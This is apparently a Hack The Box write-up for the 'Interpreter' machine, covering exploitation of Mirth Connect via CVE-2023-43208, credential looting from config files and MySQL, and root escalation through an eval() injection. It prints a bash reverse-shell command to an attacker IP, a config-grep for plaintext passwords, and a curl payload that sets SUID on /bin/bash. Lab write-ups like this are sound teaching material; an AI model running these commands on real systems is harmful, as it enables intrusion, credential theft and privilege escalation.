---
title: "Interpreter"
difficulty: Medium
os: Linux
points: 30
rating: 3.1
date: 2026-02-21
avatar: assets/htb/interpreter.png
tags: [mirth-connect, cve-2023-43208, xstream, java-deserialization, python-eval, mysql]
htb_url: https://app.hackthebox.com/machines/Interpreter
---
## Summary

Interpreter is a medium Linux box built around **NextGen Healthcare Mirth Connect** vulnerable to **CVE-2023-43208**, an unauthenticated Java deserialization RCE caused by XStream consuming attacker-controlled XML on `/api/users` with no class allowlist. The foothold lands as `mirth`. From there the Mirth installation properties expose MySQL credentials, where a stored hash cracks to an SSH login for a low-privileged user. Finally, a locally-bound root-owned Python HTTP service on port 54321 contains a Channel handler with a vulnerable `eval()`, which I abuse to escalate to root.

## Enumeration

I started with a full port scan and service detection. SSH is open on 22, and Mirth Connect is exposed on both its HTTP administrator port (8080) and its HTTPS REST API (8443).

```bash
nmap -p- --min-rate=10000 -sV -sC interpreter.htb
# 22/tcp   ssh
# 8080/tcp http  - Mirth Connect 4.4.0
# 8443/tcp https - Mirth Connect REST API
```

Mirth Connect 4.4.0 is the interesting target here. XStream-based deserialization is a recurring offender across Java app servers (Mirth, Jenkins, OFBiz), so an unpatched Mirth version is worth checking immediately against CVE-2023-43208.

## Foothold

Mirth's `/api/users` endpoint accepts XML and deserializes it via XStream without a whitelist, allowing a Commons Collections gadget chain to drive command execution. I used a public PoC to fire a reverse shell.

```bash
git clone https://github.com/IHTeam-Sec/MirthRCE && cd MirthRCE
python3 exploit.py -t https://interpreter.htb:8443 \
  -c "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'"
```

My listener returns a shell as `mirth`.

### Lateral movement to a local user

Mirth's installation properties are a classic post-foothold loot file. I pulled the database configuration, which stores plaintext MySQL credentials.

```bash
grep -i 'database.*password\|database.url' /opt/mirthconnect/conf/mirth.properties
# database.url = jdbc:mysql://localhost:3306/mirthdb
# database.password = <plaintext>

mysql -u mirth -p mirthdb -e "SELECT name, password FROM users;"
```

The stored hash format is salt-bracketed; Mirth uses PBKDF2-SHA256, so I cracked it offline with hashcat. The recovered cleartext is reused by a local system user, letting me SSH in as that user and grab the user flag.

## Privilege Escalation

I enumerated root-owned services bound to localhost and found a Python service listening on port 54321.

```bash
ss -ltnp | grep 'LISTEN.*127.0.0.1'
# 127.0.0.1:54321  python3 ... notif.py
```

Localhost-only services are not safe just because they aren't externally bound. `notif.py` runs as root and parses a JSON body, and its handler calls `eval()` on a user-controlled field. I injected a payload that flips the SUID bit on bash.

```bash
curl -s http://127.0.0.1:54321/notify \
  -H 'Content-Type: application/json' \
  -d '{"filter":"__import__(\"os\").system(\"chmod +s /bin/bash\")"}'

/bin/bash -p
# euid=0
```

With the SUID bit set, dropping a privileged shell gives me euid 0 and the root flag.
